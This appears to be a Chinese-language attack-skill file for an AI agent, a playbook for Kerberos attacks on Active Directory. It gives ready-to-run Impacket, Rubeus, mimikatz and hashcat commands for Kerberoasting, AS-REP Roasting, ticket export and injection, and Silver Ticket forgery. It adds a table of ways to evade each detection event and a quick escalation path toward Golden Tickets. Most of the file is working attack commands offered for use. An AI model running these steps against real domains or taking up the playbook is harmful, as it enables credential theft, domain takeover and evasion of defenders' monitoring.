---
name: 门帖
description: >-
 Kerberos 攻击全链：Kerberoasting（SPN 离线破解）、AS-REP Roasting、
 Pass-the-Ticket、Silver Ticket 伪造。
version: 1.0.0
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# Kerberos 攻击

## 触发条件

：
- Kerberoasting、SPN 爆破、TGS 票据离线破解
- AS-REP Roasting、不需要预认证的账户
- Pass-the-Ticket、PtT
- Silver Ticket 伪造
- krbtgt hash、Kerberos 加密类型
- GetUserSPNs、Rubeus

---

## 1. Kerberoasting（最常见）

**原理**：有 SPN 的服务账户会对请求者返回用服务账户密码加密的 TGS，可离线爆破。

```bash
# ── 攻击机（Impacket，无需任何域内机器）──
GetUserSPNs.py CORP.LOCAL/lowpriv:Password1 -dc-ip <DC_IP> -request -outputfile spns.hashes

# 仅列出 SPN 账户（不请求票据）
GetUserSPNs.py CORP.LOCAL/lowpriv:Password1 -dc-ip <DC_IP>
```

```powershell
# ── 域内机器（Rubeus）──
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:svc_sql /outfile:sql.hash # 指定账户

# PowerView 找 SPN 账户
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

```bash
# 离线破解（hashcat）
hashcat -m 13100 spns.hashes /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 spns.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --wordlist=/usr/share/wordlists/rockyou.txt spns.hashes
```

**提高成功率**：
- 优先看服务账户 `description` 字段（管理员常把密码写在备注里）
- 过滤 RC4 加密的 SPN（AES256 难破），可用 `-request-user <user>` 单独请求
- 拿到密码后检查是否多个系统复用（`crackmapexec smb <subnet> -u svc_sql -p <pass>`）

---

## 2. AS-REP Roasting（无预认证账户）

**原理**：若账户设置了"不需要 Kerberos 预身份验证"，攻击者无需密码即可请求 AS-REP，其中包含用该账户密码加密的会话密钥，可离线爆破。

```bash
# ── 攻击机（Impacket，无需凭证）──
GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.hashes
GetNPUsers.py CORP.LOCAL/ -no-pass -dc-ip <DC_IP> # 枚举所有

# 有凭证时（更全）
GetNPUsers.py CORP.LOCAL/lowpriv:Password1 -dc-ip <DC_IP> -request -format hashcat
```

```powershell
# ── 域内（Rubeus）──
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView 找目标账户
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

```bash
# 破解（hashcat mode 18200）
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

---

## 3. Pass-the-Ticket（PtT）

**原理**：拿到合法 TGT 或 TGS 直接注入当前会话，无需密码。

```powershell
# ── mimikatz：导出所有票据 ──
.\mimikatz.exe "sekurlsa::tickets /export" "exit"
# 生成 .kirbi 文件

# 注入指定票据
.\mimikatz.exe "kerberos::ptt Administrator@krbtgt-CORP.LOCAL.kirbi" "exit"
klist # 验证
dir \\DC01\C$

# ── Rubeus 方式 ──
.\Rubeus.exe tgtdeleg # 以当前用户提取可委派的 TGT
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

```bash
# ── Linux（Impacket）──
export KRB5CCNAME=/tmp/Administrator.ccache
psexec.py -k -no-pass CORP.LOCAL/Administrator@DC01.CORP.LOCAL
smbclient.py -k CORP.LOCAL/Administrator@DC01.CORP.LOCAL
```

---

## 4. Silver Ticket 伪造（伪造服务票据）

**原理**：有服务账户 NTLM hash 时，可伪造任意用户访问该服务的 TGS，不需要域控参与。

```bash
# 条件：服务账户 NTLM hash + Domain SID + 服务 SPN
ticketer.py \
 -nthash <service_account_ntlm> \
 -domain-sid S-1-5-21-xxxxx \
 -domain CORP.LOCAL \
 -spn CIFS/fileserver.CORP.LOCAL \
 Administrator

export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass CORP.LOCAL/Administrator@fileserver.CORP.LOCAL
```

```powershell
# mimikatz
.\mimikatz.exe
kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-xxx \
 /target:fileserver.CORP.LOCAL /service:cifs /rc4:<ntlm> /ptt
```

---

## 检测与绕过

| 检测点 | 规避手段 |
|--------|---------|
| 大量 TGS 请求（事件 4769）| 低频率逐个请求，仅针对 RC4 账户 |
| AS-REP 事件（4768 + no-preauth）| 与正常用户登录混入 |
| 异常票据注入（4627）| 使用合法委派账户 |

---

## 快速路径

```
有低权域账号
 → GetUserSPNs（列 SPN）→ kerberoast → hashcat
 → GetNPUsers（列无预认证）→ asreproast → hashcat
拿到 hash
 → secretsdump（若是服务账户的本地管理员）
 → Silver Ticket（访问该服务资源）
拿到 krbtgt hash
 → Golden Ticket（见 windows-ad-pentest）
```

参考：`智道藏书/三十九门/05-后手/skills/凭证转储与哈希传递-CredentialDumpingPtH.md` 
配套：`windows-ad-pentest` · `adcs-pentest` · `smb-lateral-movement`

## 真源

- 工具：`python3 炼蛊房/ad_surface_check.py --help`
